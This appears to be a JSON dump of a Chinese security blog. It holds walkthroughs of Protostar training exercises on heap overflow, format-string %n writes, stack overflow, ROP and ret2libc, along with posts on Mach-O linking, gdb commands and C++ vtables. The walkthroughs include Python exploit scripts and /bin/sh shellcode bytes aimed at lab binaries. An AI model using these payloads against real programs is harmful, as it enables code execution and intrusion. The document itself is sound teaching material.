&lt;sys/types.h&gt; struct data { char name[64]; }; struct fp { int (*fp)(); }; void winner() { printf(&quot;level passed\\n&quot;); } void nowinner() { printf(&quot;level has not been passed\\n&quot;); } int main(int argc, char **argv) { struct data *d; struct fp *f; d = malloc(sizeof(struct data)); f = malloc(sizeof(struct fp)); f-&gt;fp = nowinner; printf(&quot;data is at %p, fp is at %p\\n&quot;, d, f); strcpy(d-&gt;name, argv[1]); f-&gt;fp(); } 0x02 简单分析&amp;思考先在堆上分配了一个data和fp的结构体，然后使fp指向nowinner函数，然后打印对应分配的堆地址，以及将argv[1]复制到data结构体，最后调用nowinner函数。 可以知道我们需要去执行winner函数，怎么做到呢？ 由于strcpy没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为winner函数？Here we go！ 0x03 malloc()在继续分析之前，我们先来简单的介绍一下malloc函数，在这里malloc函数更多是对mmap系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用mmap来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。 那是如何管理堆的呢？见下 堆标志 分配大小 malloc返回地址addr 00000000 00000011 00000000 00000000 00000000 00000031 AAAAAAAA BBBBBBBB CCCCCCCC DDDDDDDD EEEEEEEE FFFFFFFF … … … … 00000000 00000011 00000000 00000000 每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过addr-4拿到自身的分配大小从而决定下次分配的选择 注：分配大小的第一位表示前面的内存块是否在使用 0x04 调试&amp;hack通过前面的分析，我们的目的很明确，需要通过strcpy(d-&gt;name, argv[1]);去重写fp结构体里面的函数指针，使其为winner函数的地址。 1.利用gdb查看strcpy前后堆的情况我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的nowinner地址改为winner地址 2.查看winner地址，重写fp函数指针 (gdb) p winner $1 = {void (void)} 0x8048464 &lt;winner&gt; 3.PoC Python脚本 import struct padding = &quot;A&quot;*64 #填充data head = &quot;BBBB&quot; # not care head += &quot;CCCC&quot; # not care winner = struct.pack(&quot;I&quot;, 0x8048464) #将nowinner地址改为winner地址 print padding+head+winner 4.hack成功执行winner函数!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"}]},{"title":"Protostar-栈溢出学习-printf格式%n任意地址写","date":"2017-04-17T03:12:19.000Z","path":"2017/04/17/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/","text":"0x00 序 从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int target; void vuln(char *string) { printf(string); if(target) { printf(&quot;you have modified the target :)\\n&quot;); } } int main(int argc, char **argv) { vuln(argv[1]); } 0x02 疑惑&amp;分析&amp;思考拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量target的值。但好像除了printf()函数，就没有其他可疑的地方了。what fuck？ 一个printf()函数怎么会有漏洞？ 但仔细观察可以发现这次printf的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？ 0x03 测试其他不说，先运行下程序试试再试着输入格式字符试试很奇怪，我们貌似得到一些栈中的值，再多打印一些试试可以看到后面打印出来了%x本身&lt;—20782520，通过linux stack layout可得知后面的确保存着参数字符串 ... local variables of main saved registers of main return address of main argc argv envp stack from startup code argc argv pointers NULL that ends argv[] environment pointers NULL that ends envp[] ELF Auxiliary Table argv strings &lt;--------focus here environment strings program name NULL 更多关于linux栈布局 0x04 你不知道的printf虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？ 关注printf函数，有这么一段话： Code such as printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole. 简单就是说%n可以写入一个内存地址，其值为前面的字符数 [n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is con‐verted. 看个例子这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了 0x05 hack先利用objdump -t找到target的地址利用一句话Python反复测试 /opt/protostar/bin/format1 &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\\x38\\x96\\x04\\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*135&quot;&#39;`&quot; 调整%x的个数，使其target地址为最后一个然后将最后一个%x改为%n /opt/protostar/bin/format1 &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\\x38\\x96\\x04\\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*134+&quot;%n &quot;&#39;`&quot; run!成功修改target值! 0x06 一点感悟总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！ 0x07 参考链接 更多关于linux栈布局 What is the use of the %n format specifier in C? Protostar/Format 1","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"printf","slug":"printf","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/printf/"},{"name":"format","slug":"format","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/format/"}]},{"title":"Protostar-栈溢出学习-ROP执行shellcode","date":"2017-04-16T03:12:19.000Z","path":"2017/04/16/Protostar-栈溢出系列学习-Stack 3/Protostar-栈溢出系列学习-Stack 3/","text":"0x00 序 和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。 0x01 stack3#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\\n&quot;, ret); _exit(1); } printf(&quot;got path %s\\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } 0x02 思路&amp;分析整体上和前面的没太大区别，现在有个问题在于__builtin_return_address()会返回当前的返回地址值，然后后面ret &amp; 0xbf000000) == 0xbf000000对其返回地址进行了限制–返回地址不能是0xbf为前缀，正好是栈的前缀。这样的话就不能像之前那样直接返回到栈中，也不能执行栈上的shellcode。 怎么绕过呢？ Ret2libc or ROP(return orientated programming) 0x03 ROP一个巧妙的方法在于我们不直接返回到栈中执行shellcode，而是返回到原本的程序之中。这里我们返回到getpath()的ret指令处。在后面在存放shellcode，而再次执行ret时就会跳转到后面执行我们的shellcode。 getpath()汇编Dump of assembler code for function getpath: 0x08048484 &lt;getpath+0&gt;: push ebp 0x08048485 &lt;getpath+1&gt;: mov ebp,esp 0x08048487 &lt;getpath+3&gt;: sub esp,0x68 0x0804848a &lt;getpath+6&gt;: mov eax,0x80485d0 0x0804848f &lt;getpath+11&gt;: mov DWORD PTR [esp],eax 0x08048492 &lt;getpath+14&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x08048497 &lt;getpath+19&gt;: mov eax,ds:0x8049720 0x0804849c &lt;getpath+24&gt;: mov DWORD PTR [esp],eax 0x0804849f &lt;getpath+27&gt;: call 0x80483b0 &lt;fflush@plt&gt; 0x080484a4 &lt;getpath+32&gt;: lea eax,[ebp-0x4c] 0x080484a7 &lt;getpath+35&gt;: mov DWORD PTR [esp],eax 0x080484aa &lt;getpath+38&gt;: call 0x8048380 &lt;gets@plt&gt; 0x080484af &lt;getpath+43&gt;: mov eax,DWORD PTR [ebp+0x4] 0x080484b2 &lt;getpath+46&gt;: mov DWORD PTR [ebp-0xc],eax 0x080484b5 &lt;getpath+49&gt;: mov eax,DWORD PTR [ebp-0xc] 0x080484b8 &lt;getpath+52&gt;: and eax,0xbf000000 0x080484bd &lt;getpath+57&gt;: cmp eax,0xbf000000 0x080484c2 &lt;getpath+62&gt;: jne 0x80484e4 &lt;getpath+96&gt; 0x080484c4 &lt;getpath+64&gt;: mov eax,0x80485e4 0x080484c9 &lt;getpath+69&gt;: mov edx,DWORD PTR [ebp-0xc] 0x080484cc &lt;getpath+72&gt;: mov DWORD PTR [esp+0x4],edx 0x080484d0 &lt;getpath+76&gt;: mov DWORD PTR [esp],eax 0x080484d3 &lt;getpath+79&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x080484d8 &lt;getpath+84&gt;: mov DWORD PTR [esp],0x1 0x080484df &lt;getpath+91&gt;: call 0x80483a0 &lt;_exit@plt&gt; 0x080484e4 &lt;getpath+96&gt;: mov eax,0x80485f0 0x080484e9 &lt;getpath+101&gt;: lea edx,[ebp-0x4c] 0x080484ec &lt;getpath+104&gt;: mov DWORD PTR [esp+0x4],edx 0x080484f0 &lt;getpath+108&gt;: mov DWORD PTR [esp],eax 0x080484f3 &lt;getpath+111&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x080484f8 &lt;getpath+116&gt;: leave 0x080484f9 &lt;getpath+117&gt;: ret 调试&amp;hack测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。 import struct padding = &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39; ret = struct.pack(&quot;I&quot;, 0x080484f9) eip_after_ret = struct.pack(&quot;I&quot;, 0xbffff78c+40) nopslide = &#39;\\x90&#39;*100 payload = &#39;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80&#39; print padding+ret+eip_after_ret+nopslide+payload 这里的ret返回地址我们改为了0x080484f9正是ret指令处的地址。eip_after_ret为真正在栈上跳转的执行地址，当然我们也加入了nopslide。 here we go! 成功运行bash！ 0x04 Ret2libc这次我们通过返回到libc里面的函数达到执行shell的目的。这里采用system(&quot;/bin/sh&quot;)。所以我们需要跳转到system函数，但同时要满足x86传参方式即要先将字符串&quot;/bin/sh&quot;压入栈中。下面我们就来做两件事： * 1，找到system在内存中的地址 * 2，找到字符串`&quot;/bin/sh&quot;`在内存中的地址 system &amp; &quot;/bin/sh&quot; 先找到/lib/libc-2.11.2.so在内存中的位置 然后找到字符串&quot;/bin/sh&quot;在/lib/libc-2.11.2.so中的偏移 验证：所以&quot;/bin/sh&quot;为0xb7fb63bf hack编写对应的Python脚本 import struct padding = &#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT&#39; system = struct.pack(&quot;I&quot;,0xb7ecffb0) #system地址 ret_after_system = &#39;AAAA&#39; #返回地址，不重要 bin_sh = struct.pack(&quot;I&quot;, 0xb7fb63bf) #参数/bin/sh地址 print padding+system+ret_after_system+bin_sh 测试 cooooool! make it!0x05 小结学习到现在，一句话总结就是：你知道得越多才知道知道得越少。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-ret跳转到自定义shellcode","date":"2017-04-15T03:12:19.000Z","path":"2017/04/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/","text":"0x00 序 经过前面的学习，我们已经了解了简单的栈溢出利用手段，建议看本文章前先看下前面的分析。这次我们来做点有趣的事，我们引入shellcode。 0x01 C语言源代码Stack5 is a standard buffer overflow, this time introducing shellcode. This level is at /opt/protostar/bin/stack5 Hints:At this point in time, it might be easier to use someone elses shellcodeIf debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debuggerremove the int3s once your shellcode is done. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } 0x02 思路&amp;分析和前面的一样，我们可以通过覆盖返回地址然后由ret指令跳转到目标地址，但这次我们没有了win()函数，那我们应该跳转到哪里呢？没错，还是跳到栈上。要达到执行代码的目的，所以我们需要在栈上写入shellcode。Here we go！ 0x03 调试&amp;hack 对应汇编，我们在0x080483da &lt;main+22&gt;: ret处下个断点 (gdb) disassemble Dump of assembler code for function main: 0x080483c4 &lt;main+0&gt;: push %ebp 0x080483c5 &lt;main+1&gt;: mov %esp,%ebp 0x080483c7 &lt;main+3&gt;: and $0xfffffff0,%esp 0x080483ca &lt;main+6&gt;: sub $0x50,%esp 0x080483cd &lt;main+9&gt;: lea 0x10(%esp),%eax 0x080483d1 &lt;main+13&gt;: mov %eax,(%esp) 0x080483d4 &lt;main+16&gt;: call 0x80482e8 &lt;gets@plt&gt; 0x080483d9 &lt;main+21&gt;: leave 0x080483da &lt;main+22&gt;: ret 同样的方法，Python脚本测试返回地址 可以发现0xbffff79c处正是返回地址，对应到TTTT,我需要在TTTT处写上我们要跳转的地址。 既然题目中说了用int 3 cc指令那我们就先来测试下–[cc指令（见文章末尾）]我们成功执行了cc INT 3指令并触发 SIGTRAP 引入nop slide为什么需要nop slide?来看看这种情况，我们再启动一个终端去调试。发现地址里面内容一样，但地址却不同，为什么会这样呢？再看看整个栈的情况可以发现，在圈中之后的栈地址都相同，但由于工作路径不同，导致前面的栈地址都发生了变化。因此，我们需要引入nop slide去解决这种情况。 填写shellcode自此，我们可以加入我们的shellcode了。这里我用的这里的shellcode。 现在我们重新编写Python脚本，制作shellcode payload 我们已经跳转的地址已经变化了40字节，并加入100的nopslide偏移，然后再执行shellcode 运行测试的确执行了dash，但并没有出现运行结果，这里很容易困惑。不应该这样的啊？经过思考，原来我们执行了/bin/dash后，并没有输入任何数据，所以就退出了。 那怎么才能让执行后输入数据呢？这里有一个小技巧，在执行后用cat指令，将输入转到输出 so cool! make it!0x04 附录INT 3 CC 详细分分析可以看这边文章int 3中断与软件调试 简单的理解就是:当我们调试程序时，可以在可能有问题的地方插入一条INT 3指令，使CPU执行到这一点时停下来。这便是软件调试中经常用到的断点（breakpoint）功能，因此INT 3指令又被称为断点指令。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip","date":"2017-04-13T03:12:19.000Z","path":"2017/04/13/Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 1/","text":"0x00 序 接着之前的系列，下面研究两种控制eip的方式 0x01 C语言源代码Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP) Hints:both gdb and objdump is your friend you determining where the win() function lies in memory. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\\n&quot;); } int main(int argc, char **argv) { volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) { printf(&quot;calling function pointer, jumping to 0x%08x\\n&quot;, fp); fp(); } } 在main函数下断点，分析可知，1处为fp的地址，2处为fp()的调用，我们需要覆盖掉esp+0x5c处所存的函数指针值，使其跳转到win()函数 利用Python编写exp测试脚本，可以发现QQQQ覆盖了函数指针 重新编写exp,将QQQQ改为win()函数的地址，即可实现自定义调用，控制eip 成功执行win()函数 0x02 通过ret指令控制eipStack4 takes a look at overwriting saved EIP and standard buffer overflows. This level is at /opt/protostar/bin/stack4 Hints:A variety of introductory papers into buffer overflows may help.gdb lets you do “run &lt; input”EIP is not directly after the end of buffer, compiler padding can also increase the size. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\\n&quot;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } 先分析一下，可以发现这个程序很简单，看上去没有可以直接控制eip的方法，但函数的调用过程在结束的时候会将保存的返回地址存在栈中，ret指令的时候会将传给eip。所以我们可以覆盖对应的返回地址值达到控制eip ______________ | | &lt;---esp -------------- | 局部变量1 | -------------- | 局部变量2 | -------------- | ... | -------------- | | &lt;---new ebp -------------- | old ebp | -------------- | 返回地址 | ret --------&gt; eip -------------- 和前面一样，这次我们之间利用Python编写exp测试脚本，可以发现SSSS覆盖了old ebp，TTTT覆盖了返回地址 我们查看win()的地址，重新编写对应exp，然后将TTTT改为其地址，成功达到目的。 成功执行win()函数","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-简单栈溢出修改局部变量值","date":"2017-04-11T03:12:19.000Z","path":"2017/04/11/Protostar-栈溢出系列学习-Stack 0/Protostar-栈溢出系列学习-Stack 0/","text":"0x01 序 为了加强自己在漏洞利用方面的能力，准备做一个栈溢出和堆溢出利用的系列学习，从最简单的栈溢出学习开始，学习平台是本地搭建的一个基于linux系统的Protostar学习虚拟机环境，里面有从易到难的示例溢出漏洞程序。那就开始吧！ 0x01 Protostar虚拟机环境搭建虚拟机下载地址 虚拟机环境搭建视频教程 默认用户名和密码: user:user root:godmode 虚拟机启动后，输入bash进入终端界面 漏洞程序在/opt/protostar/bin目录下 0x01 C语言源代码This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution. This level is at /opt/protostar/bin/stack0 #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&quot;you have changed the &#39;modified&#39; variable\\n&quot;); } else { printf(&quot;Try again?\\n&quot;); } } 0x02 思路&amp;分析这个栈溢出很简单，首先在栈上分配了64字节大小的空间，然后根据modified的值来决定执行流程，但modified始终等于0。所以我们需要利用栈溢出去修改modified的值。 0x03 调试&amp;利用 gdb连接到stack0，下break *main在main函数上下断点，然后set disassembly-flavor intel设置intel汇编指令格式,在0x08048411出下个断点 利用define hook-stop在断点触发时观察栈变量和寄存器的值 &gt;info registers &gt;x/24wx $esp &gt;end 由上图可以发现，当我们输入几个A后，0xbffff762地址已经被写入了0x41,然后我们再查看modified的值发现没有变化，通过计算发现为buffer偏移4+16*3+12字节出。 利用Python写入4+16*3+14字节数的A，发现成功修改modified的值，改变其执行流程。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Mach-o动态链接","date":"2017-04-10T03:12:19.000Z","path":"2017/04/10/mach-o动态链接/mach-o动态链接/","text":"0x00 序可执行文件很少是独立的，除了极少数的一些静态链接的可执行文件以外，大多的都是动态链接，这就需要依赖一些预先存在的库，这些库可以是操作系统提供的动态共享库，也可以是第三方的库。所以在可执行文件中充满了大量对外部库的符号的引用，这些空洞就需要动态链接器来完成所谓的符号绑定。macOS中是内核执行LC_DYLINKER加载命令时启动的，通常为/usr/lib/dyld接管刚创建进程的控制权。本文就来分析其符号的动态链接过程。 0x01 符号的加载过程以下面这个简单的C语言程序为例。 void main(int argc, char *argv[]) { printf(&quot;first printf&quot;); printf(&quot;second printf&quot;); } 对应的汇编代码 -&gt; 0x100000f40 &lt;+0&gt;: pushq %rbp 0x100000f41 &lt;+1&gt;: movq %rsp, %rbp 0x100000f44 &lt;+4&gt;: subq $0x20, %rsp 0x100000f48 &lt;+8&gt;: leaq 0x4b(%rip), %rax ; &quot;first printf&quot; 0x100000f4f &lt;+15&gt;: movl %edi, -0x4(%rbp) 0x100000f52 &lt;+18&gt;: movq %rsi, -0x10(%rbp) 0x100000f56 &lt;+22&gt;: movq %rax, %rdi 0x100000f59 &lt;+25&gt;: movb $0x0, %al 0x100000f5b &lt;+27&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f60 &lt;+32&gt;: leaq 0x40(%rip), %rdi ; &quot;second printf&quot; 0x100000f67 &lt;+39&gt;: movl %eax, -0x14(%rbp) 0x100000f6a &lt;+42&gt;: movb $0x0, %al 0x100000f6c &lt;+44&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f71 &lt;+49&gt;: movl %eax, -0x18(%rbp) 0x100000f74 &lt;+52&gt;: addq $0x20, %rsp 0x100000f78 &lt;+56&gt;: popq %rbp 0x100000f79 &lt;+57&gt;: retq 和大多数的Linux系统一样，mach-o符号的动态绑定也采用了打桩机制，简单的说就是在遇到外部符号的时候就会先跳转到stub区 第一次printf会先进入dyld_stub_binder区去找到printf函数的地址，我们用lldb调试观察DATA段la_symbol_ptr区地址值 会发现正好地址在dyld_stub_binder区 验证: 第二次printf我们在观察DATA段la_symbol_ptr区地址值 我们会发现当第二次再次调用printf函数时，还是会先跳转到stub区，但此时la_symbol_ptr中的值却变为了printf的真实地址，而不是dyld_stub_binder。这样就完成了一次延时绑定，后面就直接调用。 0x02 stub桩机制总结综上分析，我们可以发现所有的外部函数引用都会在DATA段la_symbol_ptr区中产生一个占位符，其初始值为dyld_stub_binder区中对应的编号地址。当第一个调用时，就会进入符号的动态链接过程，一旦找到其地址后，就会将DATA段la_symbol_ptr区中的占位符改为找到后的地址。这样就完成了只需要一个符号绑定。 stub桩机制的巧妙之处也在此，首先当产生一个外部符号调用时，直接跳到对应的stub桩位置，然后由里面保存的地址来判断是第一次调用还是已经找到符号的地址。就像桩这个名字含义一样，一个占位符的思想。 0x03 参考Mach-O的动态链接相关知识 Dynamic Linking: ELF vs. Mach-O Dynamic symbol table duel: ELF vs Mach-O, round 2","tags":[{"name":"mach-o","slug":"mach-o","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/mach-o/"},{"name":"dyld","slug":"dyld","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/dyld/"},{"name":"stub","slug":"stub","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/stub/"}]},{"title":"gdb常用调试命令总结","date":"2017-03-21T03:06:59.000Z","path":"2017/03/21/gdb常用调试命令总结/gdb/","text":"0x01 序最近在做TCTF上一道Linux下的逆向题，对GDB的调试很多命令相关做一个小总结，可能不是很系统，只是记一些比较常用的，后面可能会不定期更新。 0x02 命令行参数有时候，我们需要调试的程序需要有命令行参数，很多朋友都不知道怎么设置调试的程序的命令行参数。其实，有两种方法： gdb命令行的 –args 参数 gdb环境中 set args命令 show args查看程序参数 0x03 多线程调试多线程调试可能是问得最多的。其实，重要就是下面几个命令： info thread 查看当前进程的线程。thread 切换调试的线程为指定ID的线程。break file.c:100 thread all 在file.c文件第100行处为所有经过这里的线程设置断点。set scheduler-locking off|on|step，这个是问得最多的。在使用step或者continue命令调试当前被调试线程的时候，其他线程也是同时执行的，怎么只让被调试程序执行呢？通过这个命令就可以实现这个需求。 off 不锁定任何线程，也就是所有线程都执行，这是默认值。 on 只有当前被调试程序会执行。 step 在单步的时候，除了next过一个函数的情况(熟悉情况的人可能知道，这其实是一个设置断点然后continue的行为)以外，只有当前线程会执行。 0x04 断点 break *0x000000 下断点 info breakpoints 查看断点 delete break 1 删除断点 break [where] if [condition] 条件断点 enable 恢复失效的断点 disable 使断点失效 clear 清除断点 break 21 在第21行设置断点 break main 在main函数处设置断点 break test 在函数test处设置断点 0x05 x命令也许，你很喜欢用p命令。所以，当你不知道变量名的时候，你可能会手足无措，因为p命令总是需要一个变量名的。x命令是用来查看内存的，在gdb中 “help x” 你可以查看其帮助。 x/x 以十六进制输出 x/d 以十进制输出 x/c 以单字符输出 x/i 反汇编 – 通常，我们会使用 x/10i $ip-20 来查看当前的汇编（$ip是指令寄存器） x/s 以字符串输出 x/5i $pc 查看汇编代码 x/4wx 0x000000 查看内存 0x06 command命令有一些朋友问我如何自动化调试。这里向大家介绍command命令，简单的理解一下，其就是把一组gdb的命令打包，有点像字处理软件的“宏”。下面是一个示例： (gdb) break func Breakpoint 1 at 0x3475678: file test.c, line 12. (gdb) command 1 Type commands for when breakpoint 1 is hit, one per line. End with a line saying just &quot;end&quot;. &gt;print arg1 &gt;print arg2 &gt;print arg3 &gt;end (gdb) 当我们的断点到达时，自动执行command中的三个命令，把func的三个参数值打出来。 0x07 其他 step / s 下一步，直接执行下一条程序 set disassembly-flavor intel 设置为intel汇编指令 info proc mappings `define stop-hook 设置断点触发后自动执行命令 info registersx/24wx $espx/2i $eipend` continue / cont 下一段，如果遇到函数，不会进入函数，逐过程，有点类似VS里面的F10 run 运行 finish 结束调试 print / p 显示某个变量的值 p *array@len 输出数组 p i 输出i的值 0x08 附表寄存器宽度表 |63..32|31..16|15-8|7-0| |AH.|AL.| |AX.....| |EAX............| |RAX...................|","tags":[{"name":"gdb","slug":"gdb","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/gdb/"},{"name":"linux","slug":"linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"}]},{"title":"详解virtual table","date":"2017-03-06T17:51:44.000Z","path":"2017/03/07/C++ Virtual table/详解virtual table/","text":"详解virtual tableC++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。比如：模板技术，RTTI技术，虚函数技术，要么是试图做到在编译时决议，要么试图做到运行时决议。 关于虚函数的使用方法，我在这里不做过多的阐述。大家可以看看相关的C++的书籍。在这篇文章中，我只想从虚函数的实现机制上面为大家 一个清晰的剖析。 当然，相同的文章在网上也出现过一些了，但我总感觉这些文章不是很容易阅读，大段大段的代码，没有图片，没有详细的说明，没有比较，没有举一反三。不利于学习和阅读，所以这是我想写下这篇文章的原因。也希望大家多给我提意见。 言归正传，让我们一起进入虚函数的世界。 虚函数表 对C++ 了解的人都应该知道虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V-Table。 在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。这样，在有虚函数的类的实例中这个表被分配在了 这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。 这里我们着重看一下这张虚函数表。在C++的标准规格说明书中说到，编译器必需要保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证正确取到虚函数的偏移量）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。 听我扯了那么多，我可以感觉出来你现在可能比以前更加晕头转向了。 没关系，下面就是实际的例子，相信聪明的你一看就明白了。 假设我们有这样的一个类： class Base { public: virtual void f() { cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; } virtual void g() { cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; } virtual void h() { cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; } }; 按照上面的说法，我们可以通过Base的实例来得到虚函数表。 下面是实际例程： typedef void(*Fun)(void); Base b; Fun pFun = NULL; cout &lt;&lt; &quot;虚函数表地址：&quot; &lt;&lt; (int*)(&amp;b) &lt;&lt; endl; cout &lt;&lt; &quot;虚函数表 — 第一个函数地址：&quot; &lt;&lt; (int*)*(int*)(&amp;b) &lt;&lt; endl; // Invoke the first virtual function pFun = (Fun)*((int*)*(int*)(&amp;b)); pFun(); 实际运行经果如下：(Windows XP+VS2003, Linux 2.6.22 + GCC 4.1.3) 虚函数表地址：0012FED4 虚函数表 — 第一个函数地址：0044F148 Base::f 通过这个示例，我们可以看到，我们可以通过强行把&amp;b转成int *，取得虚函数表的地址，然后，再次取址就可以得到第一个虚函数的地址了，也就是Base::f()，这在上面的程序中得到了验证（把int* 强制转成了函数指针）。通过这个示例，我们就可以知道如果要调用Base::g()和Base::h()，其代码如下： (Fun)*((int*)*(int*)(&amp;b)+0); // Base::f() (Fun)*((int*)*(int*)(&amp;b)+1); // Base::g() (Fun)*((int*)*(int*)(&amp;b)+2); // Base::h() 这个时候你应该懂了吧。什么？还是有点晕。也是，这样的代码看着太乱了。没问题，让我画个图解释一下。如下所示： 